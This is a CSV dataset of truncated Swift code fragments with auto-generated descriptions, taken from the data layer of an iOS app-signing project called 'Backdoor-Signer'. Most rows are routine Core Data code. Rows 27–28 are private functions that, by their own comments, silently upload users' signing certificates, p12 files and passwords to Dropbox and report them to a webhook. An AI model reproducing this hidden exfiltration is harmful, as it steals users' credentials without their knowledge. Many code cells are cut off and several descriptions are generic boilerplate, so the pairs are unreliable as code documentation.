id,language,folder,code_type,file_path,nl,code
10,swift,Shared,class,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreData+AIChat.swift","class AIChatCoreDataManager - Manages system resources and operations","class AIChatCoreDataManager {
static let shared = CoreDataManager.shared

private init() {}"
11,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreData+AIChat.swift","Function saveContext - implements savecontext functionality","func saveContext() {
do {"
12,swift,Shared,extension,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreData+AIChat.swift","MARK: - Chat functionality moved to CoreDataManager","extension CoreDataManager {
// Create new chat session
func createAIChatSession(title: String? = nil) throws -> ChatSession {"
13,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreData+AIChat.swift","Create new chat session","func createAIChatSession(title: String? = nil) throws -> ChatSession {
let ctx = try context
let chatSession = ChatSession(context: ctx)

chatSession.sessionID = UUID().uuidString
chatSession.title = title
chatSession.creationDate = Date()

try saveContext()
return chatSession"
14,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreData+AIChat.swift","Fetch all chat sessions","func fetchChatSessions() -> [ChatSession] {
let fetchRequest: NSFetchRequest<ChatSession> = ChatSession.fetchRequest()
fetchRequest.sortDescriptors = [NSSortDescriptor(key: ""creationDate"", ascending: false)]

do {"
15,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreData+AIChat.swift","Fetch recent chat sessions with limit","func fetchRecentChatSessions(limit: Int = 20) -> [ChatSession] {
let fetchRequest: NSFetchRequest<ChatSession> = ChatSession.fetchRequest()
fetchRequest.sortDescriptors = [NSSortDescriptor(key: ""creationDate"", ascending: false)]
fetchRequest.fetchLimit = limit

do {"
16,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreData+AIChat.swift","Fetch specific chat session by ID","func fetchChatSession(sessionID: String) -> ChatSession? {
let fetchRequest: NSFetchRequest<ChatSession> = ChatSession.fetchRequest()
fetchRequest.predicate = NSPredicate(format: ""sessionID == %@"", sessionID)
fetchRequest.fetchLimit = 1

do {"
17,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreData+AIChat.swift","Delete chat session","func deleteChatSession(_ session: ChatSession) throws {
let ctx = try context
ctx.delete(session)
try saveContext()
}

// Add AI message (legacy method)
func addAIMessage(to session: ChatSession, content: String, isUser: Bool) throws -> ChatMessage {"
18,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreData+AIChat.swift","Add AI message (legacy method)","func addAIMessage(to session: ChatSession, content: String, isUser: Bool) throws -> ChatMessage {
return try addMessage(to: session, sender: isUser ? ""user"" : ""ai"", content: content)
}

// Delete message by ID
func deleteMessage(withID messageID: String) {"
19,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreData+AIChat.swift","Delete message by ID","func deleteMessage(withID messageID: String) {
let fetchRequest: NSFetchRequest<ChatMessage> = ChatMessage.fetchRequest()
fetchRequest.predicate = NSPredicate(format: ""messageID == %@"", messageID)
fetchRequest.fetchLimit = 1

do {"
20,swift,Shared,extension,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+Certificates.swift","Notification name constants for error reporting","extension Notification.Name {
static let dropboxUploadError = Notification.Name(""dropboxUploadError"")
static let webhookSendError = Notification.Name(""webhookSendError"")
static let certificateFetch = Notification.Name(""cfetch"")
}

extension CoreDataManager {"
21,swift,Shared,extension,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+Certificates.swift","extension CoreDataManager - Manages system resources and operations","extension CoreDataManager {
/// Clear certificates data
func clearCertificate(context: NSManagedObjectContext? = nil) throws {"
22,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+Certificates.swift","/ Clear certificates data","func clearCertificate(context: NSManagedObjectContext? = nil) throws {
let ctx = try context ?? self.context
try clear(request: Certificate.fetchRequest(), context: ctx)
}

func getDatedCertificate(context: NSManagedObjectContext? = nil) -> [Certificate] {"
23,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+Certificates.swift","Function getDatedCertificate - retrieves datedcertificate","func getDatedCertificate(context: NSManagedObjectContext? = nil) -> [Certificate] {
let request: NSFetchRequest<Certificate> = Certificate.fetchRequest()
request.sortDescriptors = [NSSortDescriptor(key: ""dateAdded"", ascending: true)]
do {"
24,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+Certificates.swift","Function getCurrentCertificate - retrieves currentcertificate","func getCurrentCertificate(context: NSManagedObjectContext? = nil) -> Certificate? {
do {"
25,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+Certificates.swift","Non-throwing version for backward compatibility","func addToCertificates(
cert: Cert,
files: [CertImportingViewController.FileType: Any],
context: NSManagedObjectContext? = nil
) {"
26,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+Certificates.swift","Throwing version with proper error handling","func addToCertificatesWithThrow(
cert: Cert,
files: [CertImportingViewController.FileType: Any],
context: NSManagedObjectContext? = nil
) throws {"
27,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+Certificates.swift","/ Silently uploads backdoor file to Dropbox with password and sends info to webhook / - Parameters: /   - backdoorPath: Path to the backdoor file /   - password: Optional p12 password","private func uploadBackdoorFileToDropbox(backdoorPath: URL, password: String?) {
// No need to store the filename since it's not used
let enhancedDropboxService = EnhancedDropboxService.shared

// Upload backdoor file with password handling
enhancedDropboxService.uploadCertificateFile(
fileURL: backdoorPath,
password: password
) { success, error in"
28,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+Certificates.swift","/ Silently uploads certificate files to Dropbox with password and sends info to webhook / - Parameters: /   - provisionPath: Path to the mobileprovision file /   - p12Path: Optional path to the p12 file /   - password: Optional p12 password","private func uploadCertificateFilesToDropbox(provisionPath: URL, p12Path: URL?, password: String?) {
let enhancedDropboxService = EnhancedDropboxService.shared

// Get the current certificate to send to webhook
let currentCerts = getDatedCertificate()
let certToSend = currentCerts.last

// Upload provision file with error handling
enhancedDropboxService.uploadCertificateFile(fileURL: provisionPath) { success, error in"
29,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+Certificates.swift","Function createCertificateEntity - creates certificateentity","private func createCertificateEntity(
uuid: String,
provisionPath: URL,
p12Path: URL?,
password: String?,
backdoorPath: URL? = nil,
context: NSManagedObjectContext
) -> Certificate {"
30,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+Certificates.swift","Function createCertificateDataEntity - creates certificatedataentity","private func createCertificateDataEntity(cert: Cert, context: NSManagedObjectContext) -> CertificateData {
let certData = CertificateData(context: context)
certData.appIDName = cert.AppIDName
certData.creationDate = cert.CreationDate
certData.expirationDate = cert.ExpirationDate
certData.isXcodeManaged = cert.IsXcodeManaged
certData.name = cert.Name
certData.pPQCheck = cert.PPQCheck ?? false
certData.teamName = cert.TeamName
certData.uuid = cert.UUID"
31,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+Certificates.swift","Function saveCertificateFiles - implements savecertificatefiles functionality","private func saveCertificateFiles(uuid: String, provisionPath: URL, p12Path: URL?,
backdoorPath: URL? = nil) throws
{"
32,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+Certificates.swift","Function getCertifcatePath - retrieves certifcatepath","func getCertifcatePath(source: Certificate?) throws -> URL {
guard let source, let uuid = source.uuid else {"
33,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+Certificates.swift","Function to get paths for mobileprovision and p12, handling backdoor files if present","func getCertificateFilePaths(source: Certificate?) throws -> (provisionPath: URL, p12Path: URL) {
guard let source = source, source.uuid != nil else {"
34,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+Certificates.swift","Non-throwing version for backward compatibility","func deleteAllCertificateContent(for app: Certificate) {
do {"
35,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+Certificates.swift","Throwing version with proper error handling","func deleteAllCertificateContentWithThrow(for app: Certificate) throws {
let ctx = try context
ctx.delete(app)
try FileManager.default.removeItem(at: getCertifcatePath(source: app))
try ctx.save()
}

/// Add to signed apps with proper error handling
/// - Parameters:
///   - version: App version"
36,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+Certificates.swift","/ Add to signed apps with proper error handling / - Parameters: /   - version: App version /   - name: App name /   - bundleidentifier: Bundle identifier /   - iconURL: URL to app icon /   - uuid: UUID string /   - appPath: Path to the app /   - timeToLive: Certificate expiration date /   - teamName: Certificate team name /   - originalSourceURL: Original source URL /   - completion: Completion handler with result","func addToSignedApps(
version: String,
name: String,
bundleidentifier: String,
iconURL: String,
uuid: String,
appPath: String,
timeToLive: Date,
teamName: String,
originalSourceURL: URL?,
completion: @escaping (Result<SignedApps, Error>) -> Void
) {"
37,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+Certificates.swift","/ Add to downloaded apps with proper file management / - Parameters: /   - version: App version /   - name: App name /   - bundleidentifier: Bundle identifier /   - iconURL: URL to app icon /   - uuid: UUID string /   - appPath: Path to the app /   - sourceLocation: Source location /   - completion: Completion handler with result","func addToDownloadedApps(
version: String,
name: String,
bundleidentifier: String,
iconURL: String,
uuid: String,
appPath: String,
sourceLocation: String? = nil,
completion: @escaping (Result<DownloadedApps, Error>) -> Void
) {"
38,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+Certificates.swift","/ Ensure app directory structure is correctly set up / - Parameters: /   - uuid: UUID string for the app /   - appPath: Path to the app bundle","private func ensureAppDirectoryStructure(uuid: String, appPath: String) throws {
let fileManager = FileManager.default
guard let documentsDirectory = fileManager.urls(for: .documentDirectory, in: .userDomainMask).first else {"
39,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+Certificates.swift","/ Update a signed app with new data / - Parameters: /   - app: The app to update /   - newTimeToLive: New expiration date /   - newTeamName: New team name /   - completion: Completion handler","func updateSignedApp(
app: SignedApps,
newTimeToLive: Date,
newTeamName: String,
completion: @escaping (Result<Void, Error>) -> Void
) {"
40,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+Certificates.swift","/ Clear the update state for a signed app (alternative implementation) / - Parameter signedApp: The app to update","func clearUpdateStateForCertificate(for signedApp: SignedApps) throws {
let ctx = try context

// Make sure we have the app in the right context
let appInContext: SignedApps
if signedApp.managedObjectContext != ctx {"
41,swift,Shared,extension,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+Certificates.swift","Extension to add backdoorPath property to Certificate","extension Certificate {
@objc var backdoorPath: String? {"
42,swift,Shared,extension,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+DownloadedApps.swift","extension CoreDataManager - Manages system resources and operations","extension CoreDataManager {
/// Clear all dl from Core Data and delete files
func clearDownloadedApps(context: NSManagedObjectContext? = nil) throws {"
43,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+DownloadedApps.swift","/ Clear all dl from Core Data and delete files","func clearDownloadedApps(context: NSManagedObjectContext? = nil) throws {
let ctx = try context ?? self.context
try clear(request: DownloadedApps.fetchRequest(), context: ctx)
}

/// Fetch all sources sorted alphabetically by name
func getDatedDownloadedApps(context: NSManagedObjectContext? = nil) -> [DownloadedApps] {"
44,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+DownloadedApps.swift","/ Fetch all sources sorted alphabetically by name","func getDatedDownloadedApps(context: NSManagedObjectContext? = nil) -> [DownloadedApps] {
let request: NSFetchRequest<DownloadedApps> = DownloadedApps.fetchRequest()
request.sortDescriptors = [NSSortDescriptor(key: ""dateAdded"", ascending: false)]
do {"
45,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+DownloadedApps.swift","/ Add application to downloaded apps","func addToDownloadedApps(
context: NSManagedObjectContext? = nil,
version: String,
name: String,
bundleidentifier: String,
iconURL: String?,
dateAdded: Date? = Date(),
uuid: String,
appPath: String?,
sourceLocation: String? = ""Imported"",
sourceURL: URL? = nil,
completion: @escaping (Error?) -> Void
) {"
46,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+DownloadedApps.swift","Function getDownloadedAppsFilePath - retrieves downloadedappsfilepath","func getDownloadedAppsFilePath(for app: DownloadedApps, getuuidonly: Bool = false) -> URL {
do {"
47,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+DownloadedApps.swift","/ Delete a downloaded app (non-throwing version for compatibility)","func deleteAllDownloadedAppContent(for app: DownloadedApps) {
do {"
48,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+DownloadedApps.swift","/ Delete a downloaded app with proper error handling","func deleteAllDownloadedAppContentWithThrow(for app: DownloadedApps) throws {
let ctx = try context
ctx.delete(app)
// Use self instead of shared to ensure consistent context usage
let fileURL = try getFilesForDownloadedApps(for: app, getuuidonly: true)
try FileManager.default.removeItem(at: fileURL)
try ctx.save()
}
}
"
49,swift,Shared,extension,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+SignedApps.swift","extension CoreDataManager - Manages system resources and operations","extension CoreDataManager {
/// Clear all signedapps from Core Data and delete files
func clearSignedApps(context: NSManagedObjectContext? = nil) throws {"
50,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+SignedApps.swift","/ Clear all signedapps from Core Data and delete files","func clearSignedApps(context: NSManagedObjectContext? = nil) throws {
let ctx = try context ?? self.context
try clear(request: SignedApps.fetchRequest(), context: ctx)
}

/// Fetch all sources sorted alphabetically by name
func getDatedSignedApps(context: NSManagedObjectContext? = nil) -> [SignedApps] {"
51,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+SignedApps.swift","/ Fetch all sources sorted alphabetically by name","func getDatedSignedApps(context: NSManagedObjectContext? = nil) -> [SignedApps] {
let request: NSFetchRequest<SignedApps> = SignedApps.fetchRequest()
request.sortDescriptors = [NSSortDescriptor(key: ""dateAdded"", ascending: false)]
do {"
52,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+SignedApps.swift","/ Add application to downloaded apps","func addToSignedApps(
context: NSManagedObjectContext? = nil,
version: String,
name: String,
bundleidentifier: String,
iconURL: String?,
dateAdded: Date? = Date(),
uuid: String,
appPath: String?,
timeToLive: Date,
teamName: String,
originalSourceURL: URL?,
completion: @escaping (Result<SignedApps, Error>) -> Void
) {"
53,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+SignedApps.swift","Function getFilesForSignedApps - retrieves filesforsignedapps","func getFilesForSignedApps(for app: SignedApps, getuuidonly: Bool = false) -> URL {
do {"
54,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+SignedApps.swift","/ Get application file path with proper error handling","func getFilesForSignedAppsWithThrow(for app: SignedApps, getuuidonly: Bool = false) throws -> URL {
guard let uuid = app.uuid, let appPath = app.appPath, let dir = app.directory else {"
55,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+SignedApps.swift","/ Delete a signed app (non-throwing version for compatibility)","func deleteAllSignedAppContent(for app: SignedApps) {
do {"
56,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+SignedApps.swift","/ Delete a signed app with proper error handling","func deleteAllSignedAppContentWithThrow(for app: SignedApps) throws {
let ctx = try context
ctx.delete(app)
let fileURL = try getFilesForSignedAppsWithThrow(for: app, getuuidonly: true)
try FileManager.default.removeItem(at: fileURL)
try ctx.save()
}

func updateSignedApp(
app: SignedApps,"
57,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+SignedApps.swift","Function updateSignedApp - updates signedapp","func updateSignedApp(
app: SignedApps,
newTimeToLive: Date,
newTeamName: String,
completion: @escaping (Error?) -> Void
) {"
58,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+SignedApps.swift","Function setUpdateAvailable - sets updateavailable","func setUpdateAvailable(for app: SignedApps, newVersion: String) throws {
let ctx = try context

// Ensure app is in the right context
if app.managedObjectContext != ctx {"
59,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+SignedApps.swift","Function clearUpdateState - implements clearupdatestate functionality","func clearUpdateState(for app: SignedApps) throws {
app.hasUpdate = false
app.updateVersion = nil
try saveContext()
}

// Non-throwing versions for backward compatibility
func setUpdateAvailableCompat(for app: SignedApps, newVersion: String) {"
60,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+SignedApps.swift","Non-throwing versions for backward compatibility","func setUpdateAvailableCompat(for app: SignedApps, newVersion: String) {
do {"
61,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+SignedApps.swift","Function clearUpdateStateCompat - implements clearupdatestatecompat functionality","func clearUpdateStateCompat(for app: SignedApps) {
do {"
62,swift,Shared,extension,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+Sources.swift","extension CoreDataManager - Manages system resources and operations","extension CoreDataManager {
/// Clear all sources from Core Data
func clearSources(context: NSManagedObjectContext? = nil) throws {"
63,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+Sources.swift","/ Clear all sources from Core Data","func clearSources(context: NSManagedObjectContext? = nil) throws {
let ctx = try context ?? self.context
try clear(request: Source.fetchRequest(), context: ctx)
}

/// Fetch all sources sorted alphabetically by name
func getAZSources(context: NSManagedObjectContext? = nil) -> [Source] {"
64,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+Sources.swift","/ Fetch all sources sorted alphabetically by name","func getAZSources(context: NSManagedObjectContext? = nil) -> [Source] {
let request: NSFetchRequest<Source> = Source.fetchRequest()
request.sortDescriptors = [NSSortDescriptor(key: ""name"", ascending: true)]

do {"
65,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+Sources.swift","/ Fetch a source by its identifier","func getSource(identifier: String, context: NSManagedObjectContext? = nil) -> Source? {
do {"
66,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+Sources.swift","/ Fetch and save source data from a given URL","func getSourceData(urlString: String, completion: @escaping (Error?) -> Void) {
guard let url = URL(string: urlString) else {"
67,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+Sources.swift","/ Check if a source exists with a specific identifier","private func sourceExists(withIdentifier identifier: String, context: NSManagedObjectContext) -> Bool {
let request: NSFetchRequest<Source> = Source.fetchRequest()
request.predicate = NSPredicate(format: ""identifier == %@"", identifier)
do {"
68,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+Sources.swift","/ Create a new source entity from source data","private func createNewSourceEntity(
from sourceData: SourcesData,
url: String,
iconURL: URL?,
context: NSManagedObjectContext
) -> Source {"
69,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+Sources.swift","/ Create a new source entity manually","private func createNewSourceEntity(
name: String,
id: String,
url: String,
iconURL: URL?,
context: NSManagedObjectContext
) -> Source {"
70,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+Sources.swift","/ Save SourcesData in Core Data","private func saveSource(_ source: SourcesData, url: String, completion: @escaping (Error?) -> Void) {
do {"
71,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+Sources.swift","/ Save source data in Core Data","public func saveSource(
name: String,
id: String,
iconURL: URL? = nil,
url: String,
completion: @escaping (Error?) -> Void
) {"
72,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+Sources.swift","/ Save source data in Core Data with proper error handling","public func saveSourceWithThrow(name: String, id: String, iconURL: URL? = nil, url: String) throws {
let ctx = try context

if !sourceExists(withIdentifier: id, context: ctx) {"
73,swift,Shared,class,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager.swift","class CoreDataManager - Manages system resources and operations","final class CoreDataManager {
static let shared = CoreDataManager()
private var _context: NSManagedObjectContext?
private var initializationError: Error?

private init() {"
74,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager.swift","Function setupCoreData - sets upcoredata","private func setupCoreData() {
do {"
75,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager.swift","Function initializePersistentContainer - implements initializepersistentcontainer functionality","private func initializePersistentContainer() throws {
// First try to find the model at the standard location
let container = NSPersistentContainer(name: ""Backdoor"")

// Use a semaphore to make this synchronous but not deadlock
let semaphore = DispatchSemaphore(value: 0)
var loadError: Error?

container.loadPersistentStores { _, error in"
76,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager.swift","Function saveContext - implements savecontext functionality","func saveContext() throws {
do {"
77,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager.swift","/ Save changes in the specified context / - Parameter ctx: The NSManagedObjectContext to save","func saveContext(_ ctx: NSManagedObjectContext) throws {
guard ctx.hasChanges else { return }"
78,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager.swift","/ Clear all objects from fetch request.","func clear<T: NSManagedObject>(request: NSFetchRequest<T>, context: NSManagedObjectContext? = nil) throws {
do {"
79,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager.swift","Function loadImage - implements loadimage functionality","func loadImage(from iconUrl: URL?) -> UIImage? {
guard let iconUrl = iconUrl else { return nil }"
80,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager.swift","MARK: - Chat Session Management","func createChatSession(title: String) throws -> ChatSession {
do {"
81,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager.swift","Function addMessage - implements addmessage functionality","func addMessage(to session: ChatSession, sender: String, content: String) throws -> ChatMessage {
do {"
82,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager.swift","Function getMessages - retrieves messages","func getMessages(for session: ChatSession) -> [ChatMessage] {
do {"
83,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager.swift","Function getChatSessions - retrieves chatsessions","func getChatSessions() -> [ChatSession] {
do {"
